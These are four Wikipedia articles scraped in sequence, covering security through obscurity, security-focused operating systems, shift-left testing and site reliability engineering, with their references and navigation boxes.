All articles needing additional references











From Wikipedia, the free encyclopedia






Reliance on design or implementation secrecy for security


Security through obscurity should not be used as the only security feature of a system


In 
security engineering
, 
security through obscurity
 is the practice of concealing the details or mechanisms of a system to enhance its security. This approach relies on the principle of 
hiding something in plain sight
, akin to a magician's 
sleight of hand
 or the use of 
camouflage
. It diverges from traditional security methods, such as physical locks, and is more about obscuring information or characteristics to deter potential threats. Examples of this practice include disguising sensitive information within commonplace items, like a piece of paper in a book, or altering digital footprints, such as 
spoofing a web browser's version number
. While not a standalone solution, security through obscurity can complement other 
security measures
 in certain scenarios.
[
1
]


Obscurity in the context of security engineering is the notion that information can be protected, to a certain extent, when it is difficult to access or comprehend. This concept hinges on the principle of making the details or workings of a system less visible or understandable, thereby reducing the likelihood of unauthorized access or manipulation.
[
2
]






History
[
edit
]


An early opponent of security through obscurity was the locksmith 
Alfred Charles Hobbs
, who in 1851 demonstrated to the public how state-of-the-art locks could be picked. In response to concerns that exposing security flaws in the design of locks could make them more vulnerable to criminals, he said: "Rogues are very keen in their profession, and know already much more than we can teach them."
[
3
]


There is scant formal literature on the issue of security through obscurity. Books on 
security engineering
 cite 
Kerckhoffs' doctrine
 from 1883, if they cite anything at all. For example, in a discussion about secrecy and openness in 
nuclear command and control
:



[T]he benefits of reducing the likelihood of an accidental war were considered to outweigh the possible benefits of secrecy. This is a modern reincarnation of Kerckhoffs' doctrine, first put forward in the nineteenth century, that the security of a system should depend on its key, not on its design remaining obscure.
[
4
]


Peter Swire
 has written about the trade-off between the notion that "security through obscurity is an illusion" and the military notion that "
loose lips sink ships
",
[
5
]
 as well as on how competition affects the incentives to disclose.
[
6
]
[
further explanation needed
]


There are conflicting stories about the origin of this term. Fans of 
MIT
's 
Incompatible Timesharing System
 (ITS) say it was coined in opposition to 
Multics
 users down the hall, for whom security was far more an issue than on ITS. Within the ITS culture the term referred, self-mockingly, to the poor coverage of the documentation and obscurity of many commands, and to the attitude that by the time a tourist figured out how to make trouble he'd generally got over the urge to make it, because he felt part of the community. One instance of deliberate security through obscurity on ITS has been noted: the command to allow patching the running ITS system (altmode altmode control-R) echoed as 
$$^D
. Typing Alt Alt Control-D set a flag that would prevent patching the system even if the user later got it right.
[
7
]


In January 2020, 
NPR
 reported that 
Democratic Party officials in Iowa
 declined to share information regarding the security of 
its caucus app
, to "make sure we are not relaying information that could be used against us." Cybersecurity experts replied that "to withhold the technical details of its app doesn't do much to protect the system."
[
8
]




Criticism
[
edit
]


Security by obscurity alone is discouraged and not recommended by standards bodies. The 
National Institute of Standards and Technology
 (NIST) in the 
United States
 recommends against this practice: "System security should not depend on the secrecy of the implementation or its components."
[
9
]
 The Common Weakness Enumeration project lists "Reliance on Security Through Obscurity" as CWE-656.
[
10
]


A large number of telecommunication and 
digital rights management
 cryptosystems use security through obscurity, but have ultimately been broken. These include components of 
GSM
, 
GMR
 encryption, 
GPRS
 encryption, a number of RFID encryption schemes, and most recently 
Terrestrial Trunked Radio
 (TETRA).
[
11
]


One of the largest proponents of security through obscurity commonly seen today is anti-malware software. What typically occurs with this 
single point of failure
, however, is an 
arms race
 of attackers finding novel ways to avoid detection and defenders coming up with increasingly contrived but secret signatures to flag on.
[
12
]


The technique stands in contrast with 
security by design
 and 
open security
, although many real-world projects include elements of all strategies.



Obscurity in architecture vs. technique
[
edit
]


Knowledge of how the system is built differs from concealment and 
camouflage
. The effectiveness of obscurity in 
operations security
 depends on whether the obscurity lives on top of other good security practices, or if it is being used alone.
[
13
]
 When used as an independent layer, obscurity is considered a valid security tool.
[
14
]


In recent years, more advanced versions of "security through obscurity" have gained support as a methodology in 
cybersecurity
 through Moving Target Defense and 
cyber deception
.
[
15
]
 NIST's cyber resiliency framework, 800-160 Volume 2, recommends the usage of security through obscurity as a complementary part of a resilient and secure computing environment.
[
16
]




See also
[
edit
]




Steganography


Code morphing


Need to know


Obfuscation (software)


Presumed security


Secure by design


AACS encryption key controversy


Full disclosure (computer security)


Code talker


Obfuscation


Concealment device




References
[
edit
]






^
 
Zwicky, Elizabeth D.; Cooper, Simon; Chapman, D. Brent (2000-06-26). 
Building Internet Firewalls: Internet and Web Security
. "O'Reilly Media, Inc.". 
ISBN
 
978-0-596-55188-9
.




^
 
Selinger,  Evan and Hartzog,  Woodrow, Obscurity and Privacy (May 21, 2014). Routledge Companion to Philosophy of Technology (Joseph Pitt & Ashley Shew, eds., 2014 Forthcoming),  Available at SSRN: https://ssrn.com/abstract=2439866




^
 
Stross, Randall (17 December 2006). 
"Theater of the Absurd at the T.S.A."
 
The New York Times
. 
Archived
 from the original on 8 December 2022
. Retrieved 
5 May
 2015
.




^
 
Anderson, Ross (2001). 
Security Engineering: A Guide to Building Dependable Distributed Systems
. New York, NY: John Wiley & Sons, Inc. p. 
240
. 
ISBN
 
0-471-38922-6
.




^
 
Swire, Peter P. (2004). "A Model for When Disclosure Helps Security: What is Different About Computer and Network Security?". 
Journal on Telecommunications and High Technology Law
. 
2
. 
SSRN
 
531782
.




^
 
Swire, Peter P. (January 2006). "A Theory of Disclosure for Security and Competitive Reasons: Open Source, Proprietary Software, and Government Agencies". 
Houston Law Review
. 
42
. 
SSRN
 
842228
.




^
 
"security through obscurity"
. 
The Jargon File
. 
Archived
 from the original on 2010-03-29
. Retrieved 
2010-01-29
.




^
 
"Despite Election Security Fears, Iowa Caucuses Will Use New Smartphone App"
. 
NPR.org
. 
Archived
 from the original on 2022-12-23
. Retrieved 
2020-02-06
.




^
 
"Guide to General Server Security"
 
(PDF; 258 kB)
. National Institute of Standards and Technology. 2008-07-01. 
Archived
 
(PDF)
 from the original on 2017-08-09
. Retrieved 
2011-10-02
.




^
 
"CWE-656: Reliance on Security Through Obscurity"
. The MITRE Corporation. 2008-01-18. 
Archived
 from the original on 2023-09-28
. Retrieved 
2023-09-28
.




^
 
Midnight Blue (August 2023). 
ALL COPS ARE BROADCASTING: Breaking TETRA after decades in the shadows (slideshow)
 
(PDF)
. Blackhat USA 2023. 
Archived
 
(PDF)
 from the original on 2023-08-11
. Retrieved 
2023-08-11
.


Carlo Meijer; Wouter Bokslag; Jos Wetzels (August 2023). 
All cops are broadcasting: TETRA under scrutiny (paper)
 
(PDF)
. Usenix Security 2023. 
Archived
 
(PDF)
 from the original on 2023-08-11
. Retrieved 
2023-08-11
.




^
 
KPMG (May 2022). 
"The cat and mouse game of antivirus evasion"
. 
Archived
 from the original on 2023-08-28
. Retrieved 
2023-08-28
.




^
 
"Obscurity is a Valid Security Layer - Daniel Miessler"
. 
Daniel Miessler
. 
Archived
 from the original on 2022-12-08
. Retrieved 
2018-06-20
.




^
 
"Cyber Deception | CSIAC"
. 
www.csiac.org
. 
Archived
 from the original on 2021-04-20
. Retrieved 
2018-06-20
.




^
 
"CSD-MTD"
. 
Department of Homeland Security
. 2013-06-25. 
Archived
 from the original on 2022-12-08
. Retrieved 
2018-06-20
.




^
 
Ross, Ron; Graubart, Richard; Bodeau, Deborah; McQuaid, Rosalie (2018-03-21). 
Systems Security Engineering: Cyber Resiliency Considerations for the Engineering of Trustworthy Secure Systems
 (Report). National Institute of Standards and Technology. 
Archived
 from the original on 2023-12-06
. Retrieved 
2024-04-05
.






External links
[
edit
]


Eric Raymond on Cisco's IOS source code 'release' v Open Source


Computer Security Publications: Information Economics, Shifting Liability and the First Amendment
 by Ethan M. Preston and John Lofton


"Security Through Obscurity" Ain't What They Think It Is
 at the 
Wayback Machine
 (archived February 2, 2007) by Jay Beale


Secrecy, Security and Obscurity
 & 
The Non-Security of Secrecy
 by 
Bruce Schneier


"Security through obsolescence", Robin Miller, 
linux.com
, June 6, 2002










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Security_through_obscurity&oldid=1235008039
"


Categories
: 
Computer security procedures
Cryptography
Secrecy
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Wikipedia articles needing clarification from September 2022
Webarchive template wayback links











From Wikipedia, the free encyclopedia






Operating systems focused on security




This is a list of 
operating systems
 specifically focused on 
security
. Similar concepts include 
security-evaluated operating systems
 that have achieved certification from an 
auditing
 organization, and 
trusted operating systems
 that provide sufficient support for 
multilevel security
 and evidence of 
correctness
 to meet a particular set of requirements.





Linux
[
edit
]


Main article: 
Linux


Android-based
[
edit
]


Main article: 
Android (operating system)


DivestOS
 is a 
fork
 of 
LineageOS
 that aims to increase privacy and security.


GrapheneOS
 is a privacy and security-focused 
mobile operating system
 for selected 
Google Pixel
 
smartphones
 and tablets.


Debian-based
[
edit
]


Main article: 
Debian


Tails
 is aimed at preserving 
privacy
 and 
anonymity
.
[
1
]


Whonix
 consists of two 
virtual machines
. All communications are forced through 
Tor
.
[
2
]
[
3
]
[
4
]


Other Linux distributions
[
edit
]


Alpine Linux
 is designed to be small, simple, and secure.
[
5
]
 It uses 
musl
, 
BusyBox
, and 
OpenRC
 instead of the more commonly used 
glibc
, 
GNU Core Utilities
, and 
systemd
.
[
6
]


BSD
[
edit
]


Main article: 
Berkeley Software Distribution


OpenBSD
 is a 
Unix-like
 
operating system
 that emphasizes 
portability
, 
standardization
, 
correctness
, proactive 
security
, and integrated 
cryptography
.
[
7
]


Xen
[
edit
]


Main article: 
Xen


Qubes OS
 aims to provide 
security
 through isolation.
[
8
]
 Isolation is provided through the use of 
virtualization
 technology. This allows the segmentation of applications into secure 
virtual machines
.


See also
[
edit
]




Computer security


Comparison of operating systems


Security engineering


References
[
edit
]






^
 
Vervloesem, Koen (27 April 2011). 
"The Amnesic Incognito Live System: A live CD for anonymity [LWN.net]"
. 
lwn.net
. 
Archived
 from the original on 21 August 2017
. Retrieved 
14 June
 2017
.




^
 
"Devs cook up 'leakproof' all-Tor untrackable platform"
. The Register. 13 November 2012
. Retrieved 
10 July
 2014
.




^
 
Greenburg, Andy (17 June 2014). 
"How to Anonymize Everything You Do Online"
. Wired
. Retrieved 
10 July
 2014
.




^
 
"Whonix adds a layer of anonymity to your business tasks"
. TechRepublic. 4 January 2013
. Retrieved 
10 July
 2014
.




^
 
"about | Alpine Linux"
. 
alpinelinux.org
.




^
 
says, GigaTux (24 August 2010). 
"Alpine Linux 2 review | LinuxBSDos.com"
.




^
 
OpenBSD Project (19 May 2020). 
"OpenBSD"
. 
OpenBSD.org
. Retrieved 
12 October
 2020
.




^
 
"Qubes OS bakes in virty system-level security"
. 
The Register
. 5 September 2012.






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Security-focused_operating_system&oldid=1246977126
"


Categories
: 
Computer security
Operating system security
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Use dmy dates from July 2018











From Wikipedia, the free encyclopedia






Type of software testing


This article has multiple issues.
 Please help 
improve it
 or discuss these issues on the 
talk page
. 
(
Learn how and when to remove these messages
)




This article includes a list of general 
references
, but 
it lacks sufficient corresponding 
inline citations
.
 Please help to 
improve
 this article by 
introducing
 more precise citations.
 
(
May 2015
)
 (
Learn how and when to remove this message
)
This article 
is written like a 
personal reflection, personal essay, or argumentative essay
 that states a Wikipedia editor's personal feelings or presents an original argument about a topic.
 Please 
help improve it
 by rewriting it in an 
encyclopedic style
.
 
(
May 2015
)
 (
Learn how and when to remove this message
)




 (
Learn how and when to remove this message
)


Shift-left testing
[
1
]
 is an approach to 
software testing
 and 
system testing
 in which testing is performed earlier in the 
lifecycle
 (i.e. moved left on the project timeline). It is the first half of the maxim "test early and often".
[
2
]
 It was coined by Larry Smith in 2001.
[
3
]
[
4
]






Harm because of late testing
[
edit
]


Shift-left testing aims to prevent the following types of harm because of late testing:



Insufficient resources allocated to testing.


Undiscovered defects in requirements, architecture, and design, along with significant effort wasted while implementing them.


Difficulty 
debugging
 (including identifying, localizing, fixing, and regression testing defects) as more software is produced and integrated.


Reduced 
code coverage
 during testing
[
citation needed
]
 as a result of 
encapsulation
 impeding 
white-box testing
.


A “bow wave” of 
technical debt
 that can cause a project to fail.


Types of shift-left testing
[
edit
]


There are four basic ways to shift testing earlier in the life-cycle (that is, leftward on the classic 
V-model
). These can be referred to as traditional shift-left testing,
[
5
]
 incremental shift-left testing, Agile/DevOps shift-left testing,
[
6
]
[
7
]
 and model-based shift-left testing.
[
8
]




Traditional shift-left testing
[
edit
]


As illustrated in the following figure, traditional shift-left moves the emphasis of testing lower down (and therefore slightly to the left) on the right hand side of the classic V model. Instead of emphasizing acceptance and system level testing (e.g., 
GUI testing
 with record and playback tools
[
9
]
), traditional shift-left concentrates on 
unit testing
 and 
integration testing
 (e.g., using 
API testing
 and modern test tools). The transition to traditional shift-left testing has largely been completed.
[
by whom?
]










Traditional shift-left testing






Incremental shift-left testing
[
edit
]


As illustrated in the following figure, many projects developing large and complex software-reliant systems decompose development into a small number of increments (Vs) having correspondingly shorter durations. The shift-left illustrated by the dashed red arrows occurs because parts of the single, large waterfall V model’s types of testing (shown in gray) are shifted left to become increments of the corresponding types of testing in the smaller incremental V models. When each increment is also a delivery to the customer and operations, then incremental shift-left testing shifts both developmental testing and operational testing to the left. Incremental shift-left testing is popular when developing large, complex systems, especially those incorporating significant amounts of hardware. Like traditional shift-left, the transition to incremental shift-left has also been largely completed.









Incremental shift-left testing






Agile/DevOps shift-left testing
[
edit
]


As illustrated in the following figure, 
Agile
 and 
DevOps
 projects have numerous short duration Vs (sprints) in lieu of a single or small number of V as in the previous two examples of shift-left testing. These small Vs would also be modified if one or more early sprints are used to block out the basic requirements and architecture or if test-first and 
test-driven development
 (TDD) are being performed. The shift-left occurs because the types of testing on the right sides of the earliest of these tiny Vs are to the left of the corresponding types of testing on right side of the larger V(s) they replace. While the following figure appears remarkably the same for Agile and DevOps, Agile testing is typically restricted to developmental testing and does not include operational testing, which occurs once the system is placed into operation. The transition to Agile/DevOps shift-left testing is currently popular and ongoing.









Agile/DevOps shift-left testing






Model-based shift-left testing
[
edit
]


The previous forms all concentrated on testing earlier in the development cycle.  However, they all test 
after
 software exists and seek to uncover only implementation defects.
[
citation needed
]


Model-based testing moves testing to the left side of the Vs, by testing requirements, architecture, and design models.  This shift begins testing almost immediately, instead of waiting a long time (traditional testing), medium time (incremental testing), or short time (Agile/DevOps) for software to become available to the right side of the Vs.  This trend is just beginning.









Model-based shift-left testing






References
[
edit
]






^
 
Donald Firesmith (23 March 2015). 
"Four Types of Shift Left Testing"
. Archived from 
the original
 on 2015-09-05
. Retrieved 
27 March
 2015
.




^
 
Microsoft (2012). 
"Test Early and Often"
. 
Archived
 from the original on 2 April 2015
. Retrieved 
27 March
 2015
.




^
 
Smith, Larry (September 2001). 
"Shift-Left Testing"
. 
Dr. Dobb's Journal
. 
26
 (9): 56, 62. 
Archived
 from the original on 2020-06-21
. Retrieved 
2020-06-04
.




^
 
"Sep01: Shift-Left Testing"
. 2014-08-10. Archived from 
the original
 on 2014-08-10
. Retrieved 
2019-09-06
.




^
 
Velocity Partners (28 January 2014). 
"Agile Testing - The Agile Test Automation Pyramid"
. 
Archived
 from the original on 2 April 2015
. Retrieved 
27 March
 2015
.




^
 
Paul Bahrs (6 November 2014). 
"Shift Left: Approaches and Practices"
. 
Archived
 from the original on 6 April 2015
. Retrieved 
27 March
 2015
.




^
 
Dibbe Edwards (18 September 2014). 
"Enabling DevOps Success with Shift Left Continuous Testing"
. 
IBM
. 
Archived
 from the original on 2 April 2015
. Retrieved 
27 March
 2015
.




^
 
Donald Firesmith (11 November 2013). 
"Using V Models for Testing"
. 
Archived
 from the original on 2 April 2015
. Retrieved 
27 March
 2015
.




^
 
Microsoft (2013). 
"Record and Playback Manual Tests"
. 
Archived
 from the original on 2 April 2015
. Retrieved 
27 March
 2015
.






External links
[
edit
]


"Shift Left" Devopedia


v
t
e
Software testing
The "box" approach


Black-box testing


All-pairs testing


Exploratory testing


Fuzz testing


Model-based testing


Scenario testing


Grey-box testing


White-box testing


API testing


Mutation testing


Static testing


Testing levels


Acceptance testing


Integration testing


System testing


Unit testing


Testing types, techniques,
and 
tactics


A/B testing


Benchmark


Compatibility testing


Concolic testing


Concurrent testing


Conformance testing


Continuous testing


Destructive testing


Development testing


Differential testing


Dynamic program analysis


Installation testing


Negative testing


Random testing


Regression testing


Security testing


Smoke testing (software)


Software performance testing


Stress testing


Symbolic execution


Test automation


Usability testing


See also


Graphical user interface testing


Manual testing


Orthogonal array testing


Pair testing


Soak testing


Software reliability testing


Stress testing


Web testing












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Shift-left_testing&oldid=1224965929
"


Category
: 
Software testing
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles lacking in-text citations from May 2015
All articles lacking in-text citations
Wikipedia articles with style issues from May 2015
All articles with style issues
Articles with multiple maintenance issues
All articles with unsourced statements
Articles with unsourced statements from October 2017
Articles with specifically marked weasel-worded phrases from April 2016
Articles with unsourced statements from January 2021











From Wikipedia, the free encyclopedia






Use of software engineering practices for IT


This article has multiple issues.
 Please help 
improve it
 or discuss these issues on the 
talk page
. 
(
Learn how and when to remove these messages
)




This article contains wording that 
promotes the subject in a subjective manner
 without imparting real information
.
 Please remove or replace such wording and instead of making proclamations about a subject's importance, use facts and attribution to demonstrate that importance.
 
(
May 2023
)
 (
Learn how and when to remove this message
)
This article appears to 
contain a large number of 
buzzwords
.
 There might be a discussion about this on the 
talk page
. Please help 
improve this article
 if you can.
 
(
May 2023
)




 (
Learn how and when to remove this message
)


Site reliability engineering
 (
SRE
) is a set of principles and practices that applies aspects of 
software engineering
 to IT 
infrastructure
 and 
operations
.
[
1
]
 SRE aims to create 
highly reliable
 and 
scalable
 IT systems. Although they are closely related, SRE is slightly different from 
DevOps
.
[
2
]
[
3
]
[
4
]






History
[
edit
]


The field of site reliability engineering originated at 
Google
 with Ben Treynor Sloss,
[
5
]
[
6
]
 who founded a site reliability team after joining the company in 2003.
[
7
]
 In 2016, Google employed more than 1,000 site reliability engineers.
[
8
]
 After originating at Google in 2003, the concept spread into the broader software development industry, and other companies subsequently began to employ site reliability engineers.
[
9
]
 The position is more common at larger web companies, as small companies often do not operate at a scale that would require dedicated SREs.
[
9
]
 
Organizations
 that have adopted the concept include 
Airbnb
, 
Dropbox
, 
IBM
,
[
10
]
 
LinkedIn
,
[
11
]
 
Netflix
,
[
8
]
 and 
Wikimedia
.
[
12
]
 According to a 2021 report by the DevOps Institute, 22% of respondents in a survey of 2,000 worldwide IT professionals had adopted the SRE model compared to 15% percent the previous year.
[
13
]
[
14
]




Definition
[
edit
]


Site reliability engineering, as a job role, may be performed by individual contributors or organized in teams, responsible for a combination of the following within a broader engineering organization: System 
availability
, 
latency
, 
performance
, efficiency, 
change management
, 
monitoring
, 
emergency response
, and 
capacity planning
.
[
15
]
 Site reliability engineers often have backgrounds in 
software engineering
, 
system engineering
, or 
system administration
.
[
16
]
 Focuses of SRE include automation, 
system design
, and improvements to 
system resilience
.
[
16
]


Site reliability engineering, as a set of principles and practices, can be performed by anyone. Though everyone should contribute to good practices, as occurs in 
security engineering
, a company may eventually hire specialists and engineers for the job.
[
citation needed
]


Site reliability engineering is considered a specific implementation of DevOps;
[
17
]
 SRE focuses specifically on building reliable systems, whereas DevOps focuses more broadly.
[
2
]
[
3
]
[
4
]
 Although they have different focuses, some companies have rebranded their operations teams to SRE teams with little meaningful change.
[
9
]




Principles and practices
[
edit
]


There have been multiple attempts to define a canonical list of site reliability engineering principles, but while consensus is lacking, the following characteristics are usually included in most definitions:
[
1
]
[
18
]




Automation or elimination of anything repetitive in a cost-effective way.


Avoidance to pursue much more reliability than what's strictly necessary. Defining what's necessary is a practice by itself (see list of practices below).


Systems designed with a bias toward the reduction of risks to availability, latency, and efficiency.


Observability
—as in, the ability to ask arbitrary questions about a system without having to know ahead of time what to ask.
[
19
]


The site reliability engineering practices also vary widely, but the list below is relatively commonly seen as at least partially implemented: 



Toil management
 as the implementation of the first principle outlined above.


Defining and measuring reliability goals—
SLIs
, 
SLOs
, and error budgets.


Non-Abstract Large Scale Systems Design (
NALSD
) with a focus on reliability.


Designing for and implementing observability.


Defining, testing, and running an 
incident management
 process.


Capacity planning
.


Change and release management, including 
CI/CD
.


Chaos engineering
.


Implementations
[
edit
]


Site Reliability Engineering (SRE) teams collaborate with other departments within organizations to implement SRE principles effectively. Below is an overview of common practices:
[
20
]




Kitchen Sink, a.k.a. “Everything SRE”
[
edit
]


In Site Reliability Engineering (SRE), "
Kitchen Sink
" refers to the expansive and often unbounded scope of services and workflows that SRE teams oversee. Unlike traditional roles with clearly defined boundaries, SREs are tasked with various responsibilities, including everything from system design and performance optimization to incident management and automation. This holistic approach allows SREs to address many challenges, ensuring that systems run efficiently and evolve in response to changing demands and complexities. By embracing this comprehensive perspective, SRE teams can foster a culture of continuous improvement and resilience, ultimately enhancing the overall reliability of services.



Infrastructure
[
edit
]


Infrastructure SRE (Site Reliability Engineering) teams focus on maintaining and improving the reliability of key systems that support other teams’ workflows. While they sometimes collaborate with platform engineering teams, their primary responsibility is ensuring uptime, performance, and efficiency. Platform teams, on the other hand, primarily develop the software and systems used across the organization. While reliability is a goal for both, platform teams prioritize creating and maintaining the tools and services used by internal stakeholders, whereas Infrastructure SRE teams are tasked with ensuring those systems run smoothly and meet reliability standards.



Tools
[
edit
]


Teams utilize a variety of tools to measure, maintain, and enhance system reliability. These tools play a crucial role in monitoring performance, identifying issues, and facilitating proactive maintenance. For instance, 
Nagios Core
 is widely used for system monitoring and alerting, while 
Prometheus (software)
 is popular for collecting and querying metrics in cloud-native environments. Leveraging these tools, SRE teams can ensure optimal performance and quickly respond to potential reliability challenges.



Product or application
[
edit
]


Site Reliability Engineering (SRE) teams dedicated to specific products or applications are common in large organizations. These teams are responsible for ensuring the reliability, scalability, and performance of key services. In larger companies, it's typical to have multiple SRE teams, each focusing on different products or applications, ensuring that each area receives specialized attention to meet performance and availability targets



Embedded
[
edit
]


In an embedded model, individual SREs or small SRE pairs are integrated directly within software engineering teams. These SREs work closely with developers, applying core SRE principles, such as automation, monitoring, and incident response—directly to the software development lifecycle. This approach helps improve reliability and performance while fostering collaboration between SREs and developers.



Consulting
[
edit
]


Consulting SRE teams specialize in advising organizations on the implementation of SRE principles and practices. Typically composed of seasoned SREs with extensive experience across various implementations, these teams provide valuable insights and guidance tailored to specific organizational needs. When working directly with clients, these SREs are often referred to as '
Customer Reliability Engineers
.'

In large organizations that have adopted SRE, a hybrid model is common. This model includes various implementations, such as multiple Product/Application SRE teams dedicated to addressing the unique reliability needs of different products. An Infrastructure SRE team may collaborate with a Platform engineering group to achieve shared reliability goals for a unified platform that supports all products and applications



Industry
[
edit
]


Since 2014, the 
USENIX
 organization has hosted the annual 
SREcon
 conference, bringing together site reliability engineers from various industries. This conference serves as a platform for professionals to share knowledge, explore best practices, and discuss the latest trends in site reliability engineering.
[
21
]




See also
[
edit
]




Chaos engineering


Cloud computing


Data center


Disaster recovery


High availability software


Infrastructure as code


Operations, administration and management


Operations management


Reliability engineering


System administration


Backup site




References
[
edit
]






^ 
a
 
b
 
"Evaluating where your team lies on the SRE spectrum"
. 
Google Cloud Blog
. Retrieved 
2021-06-26
.




^ 
a
 
b
 
Beyer, Betsy; Jones, Chris; Petoff, Jennifer; Murphy, Niall, eds. (2016). 
Site Reliability Engineering: How Google Runs Production Systems
. Sebastopol, CA: 
O'Reilly Media
. 
ISBN
 
978-1-4919-5118-7
. 
OCLC
 
945577030
.




^ 
a
 
b
 
Vargo, Seth; 
Fong-Jones, Liz
 (March 1, 2018). 
What's the Difference Between DevOps and SRE? (class SRE implements DevOps)
 (Video). 
Google
.




^ 
a
 
b
 
"What is SRE? - SRE Explained - AWS"
. 
Amazon Web Services, Inc
. Retrieved 
2022-11-05
.




^
 
Hill, Patrick. 
"Love DevOps? Wait until you meet SRE"
. 
Atlassian
. Retrieved 
June 17,
 2021
.




^
 
"What is SRE?"
. 
Red Hat
. Retrieved 
June 17,
 2021
.




^
 
Treynor, Ben (2014). 
"Keys to SRE"
. 
USENIX
 SREcon14
. Retrieved 
June 17,
 2021
.




^ 
a
 
b
 
Fischer, Donald (March 2, 2016). 
"Are site reliability engineers the next data scientists?"
. 
TechCrunch
. Retrieved 
June 17,
 2021
.




^ 
a
 
b
 
c
 
Gossett, Stephen (June 1, 2020). 
"What Is a Site Reliability Engineer? What Does an SRE Do?"
. 
Built In
. Retrieved 
June 17,
 2021
.




^
 
"Site Reliability Engineering"
. 
IBM Cloud Education
. 
IBM
. November 12, 2020
. Retrieved 
June 21,
 2021
.




^
 
"Site Reliability Engineering (SRE)"
. 
engineering.linkedin.com
. Retrieved 
March 12,
 2024
.




^
 
"SRE - Wikitech"
. 
wikitech.wikimedia.org
. Retrieved 
2021-10-17
.




^
 
Oehrlich, Eveline; Groll, Jayne; Garbani, Jean-Pierre (2021). 
Upskilling 2021 Enterprise DevOps SkillsReport
 
(PDF)
 (Report). DevOps Institute
. Retrieved 
June 17,
 2021
.




^
 
Oehrlich, Eveline (May 4, 2021). 
"What it takes to be a site reliability engineer"
. 
TechBeacon
. 
Micro Focus
. Retrieved 
June 17,
 2021
.




^
 
Treynor, Ben. 
"In Conversation"
 (Interview). Interviewed by Niall Murphy. Google Site Reliability Engineering.




^ 
a
 
b
 


Jones, Chris; Underwood, Todd; Nukala, Shylaja (June 2015). 
"Hiring Site Reliability Engineers"
 
(PDF)
. 
;login:
. Vol. 40, no. 3. pp. 35–39
. Retrieved 
June 17,
 2021
.




^
 
Dave Harrison (9 Oct 2018). 
"Interview with Betsy Beyer, Stephen Thorne of Google"
. Retrieved 
24 July
 2024
.




^
 
"The 7 SRE Principles [And How to Put Them Into Practice]"
. 
www.blameless.com
. Retrieved 
2021-06-26
.




^
 
"Learn about observability | Honeycomb"
. 
docs.honeycomb.io
. Retrieved 
2021-06-26
.




^
 
"SRE at Google: How to structure your SRE team"
. 
Google Cloud Blog
. Retrieved 
2021-06-26
.




^
 
"Usenix SREcon"
. 
USENIX
. 2021
. Retrieved 
June 17,
 2021
.






Further reading
[
edit
]


Limoncelli, Tom; Chalup, Strata R.; Hogan, Christina J. (September 2014). 
The Practice of Cloud System Administration: DevOps and SRE Practices for Web Services
. Vol. 2. Upper Saddle River, NJ: 
Addison-Wesley
. 
ISBN
 
978-0133478549
. 
OCLC
 
891786231
.


Beyer, Betsy; Jones, Chris; Petoff, Jennifer; Murphy, Niall Richard, eds. (2016). 
Site Reliability Engineering: How Google Runs Production Systems
. 
O'Reilly
. 
ISBN
 
978-1491929124
.


Blank-Edelman, David N., ed. (2018). 
Seeking SRE: Conversations About Running Production Systems at Scale
 (1 ed.). Sebastopol, CA: O'Reilly. 
ISBN
 
978-1491978863
. 
OCLC
 
1052565720
.


Beyer, Betsy; Murphy, Niall; Kawahara, Kent; Rensin, David; Thorne, Stephen (2018). 
The Site Reliability Workbook: Practical Ways to Implement SRE
. O'Reilly. 
ISBN
 
978-1492029502
.


Welch, Nat (2018). 
Real-World SRE: The Survival Guide for Responding to a System Outage and Maximizing Uptime
. 
Packt
. 
ISBN
 
978-1788628884
.


Adkins, Heather; Beyer, Betsy; Blankinship, Paul; Lewandowski, Piotr; Oprea, Ana; Stubblefield, Adam (2020). 
Building Secure and Reliable Systems: Best Practices for Designing, Implementing, and Maintaining Systems
. O'Reilly. 
ISBN
 
978-1-4920-8312-2
. 
OCLC
 
1129470292
.


Rosenthal, Jones, Casey, Nora (2020). 
Chaos Engineering: System Resiliency in Practice
. O'Reilly. 
ISBN
 
978-1492043867
.
{{
cite book
}}
:  CS1 maint: multiple names: authors list (
link
)


External links
[
edit
]


Awesome Site Reliability Engineering
 resources list


How they SRE
 resources list


SRE Weekly
 weekly newsletter devoted to SRE


SRE at Google
 landing page for learning more about SRE in Google


Komodor K8s Reliability
 learning center with resources for SREs working with Kubernetes


v
t
e
Software engineering
Fields


Computer programming


DevOps


Empirical software engineering


Experimental software engineering


Formal methods


Requirements engineering


Search-based software engineering


Site reliability engineering


Social software engineering


Software deployment


Software design


Software maintenance


Software testing


Systems analysis


Concepts


Abstraction


Component-based software engineering


Software compatibility


Backward compatibility


Compatibility layer


Compatibility mode


Forward compatibility


Software incompatibility


Data modeling


Enterprise architecture


Functional specification


Modeling language


Programming paradigm


Software


Software archaeology


Software architecture


Software configuration management


Software development process/methodology


Software quality


Software quality assurance


Software verification and validation


Software system


Structured analysis


Essential analysis


CI/CD


Orientations


Agile


Aspect-oriented


Object orientation


Ontology


Service orientation


SDLC


Models
Developmental


Agile


EUP


Executable UML


Incremental model


Iterative model


Prototype model


RAD


UP


Scrum


